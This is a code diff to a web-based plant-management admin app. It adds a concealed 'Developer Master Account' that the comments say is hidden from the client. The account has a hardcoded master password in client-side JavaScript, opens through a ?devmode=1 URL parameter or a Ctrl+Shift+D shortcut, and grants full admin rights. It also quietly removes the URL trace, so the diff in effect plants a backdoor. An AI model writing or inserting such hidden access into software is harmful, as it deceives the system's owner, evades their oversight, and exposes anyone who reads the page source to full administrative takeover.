@@ -2876,6 +2876,70 @@ let adminAuthenticated = false; // will be set true only after password check or
 let plantOwnerAuthenticated = false; // true when a plant owner is logged in
 let currentPlantSession = null;      // the plant object the owner is logged into
 
+// ── Developer Master Account (hidden from client) ─────────────────────
+// This account is NEVER shown in UI, Settings, or any panel.
+// Access: URL param ?devmode=1  OR  Ctrl+Shift+D on login screen
+// Password is hardcoded here only — never stored in Firestore or localStorage.
+let _devAuthenticated = false;
+const _DEV_PASSWORD = 'dev@polyplastics#2026'; // change this before handing to client
+
+function _showDevLoginPrompt(){
+  const pwd = prompt('🔧 Developer Access\nEnter master password:');
+  if(pwd === null) return; // cancelled
+  if(pwd === _DEV_PASSWORD){
+    _devAuthenticated = true;
+    adminAuthenticated = true;
+    // Show full admin UI exactly like super admin
+    document.getElementById('admin-nav').style.display = 'block';
+    document.getElementById('btn-admin-mode').style.display = '';
+    document.getElementById('btn-user-mode').style.display = '';
+    document.getElementById('btn-export').style.display = 'flex';
+    const sidebarBottom = document.querySelector('.sidebar-bottom');
+    if(sidebarBottom){ sidebarBottom.style.display=''; sidebarBottom.style.visibility=''; }
+    // Add a subtle DEV badge in topbar — only visible to developer
+    const topbar = document.getElementById('topbar');
+    if(topbar && !document.getElementById('dev-badge')){
+      const badge = document.createElement('span');
+      badge.id = 'dev-badge';
+      badge.title = 'Developer session active';
+      badge.style.cssText = 'background:rgba(167,139,250,.18);border:1px solid rgba(167,139,250,.35);color:#a78bfa;font-size:10px;font-weight:800;letter-spacing:1px;padding:2px 8px;border-radius:6px;text-transform:uppercase;cursor:default;user-select:none;';
+      badge.textContent = '⚙ DEV';
+      // Insert at the start of topbar left side
+      const titleEl = document.getElementById('topbar-title');
+      if(titleEl && titleEl.parentNode) titleEl.parentNode.insertBefore(badge, titleEl);
+    }
+    // Clean URL param without page reload
+    const url = new URL(window.location.href);
+    url.searchParams.delete('devmode');
+    history.replaceState(null,'',url.toString());
+    toast('🔧 Developer session active','var(--purple)');
+    showPanel('dashboard');
+  } else if(pwd !== '') {
+    alert('❌ Incorrect developer password.');
+  }
+}
+
+// Keyboard shortcut: Ctrl+Shift+D  (only works on login screen)
+document.addEventListener('keydown', function(e){
+  if(e.ctrlKey && e.shiftKey && e.key === 'D'){
+    if(!adminAuthenticated && !plantOwnerAuthenticated){
+      e.preventDefault();
+      _showDevLoginPrompt();
+    }
+  }
+});
+
+// URL param trigger: ?devmode=1
+(function(){
+  const params = new URL(window.location.href).searchParams;
+  if(params.get('devmode') === '1'){
+    // Defer until after DOM/login screen is ready
+    window.addEventListener('DOMContentLoaded', function(){
+      setTimeout(_showDevLoginPrompt, 400);
+    });
+  }
+})();
+
 function showAdminLoginScreen(){
   adminAuthenticated = false;
   // Hide sidebar nav items and action buttons — keep sidebar visible
@@ -3323,6 +3387,10 @@ function handleLogout(){
     if(!confirm('Log out of admin session?'))return;
     userEmail='';
     userTask=null;
+    // Clear developer session if active
+    _devAuthenticated = false;
+    const devBadge = document.getElementById('dev-badge');
+    if(devBadge) devBadge.remove();
     showAdminLoginScreen();
     toast('Admin logged out successfully');
   }
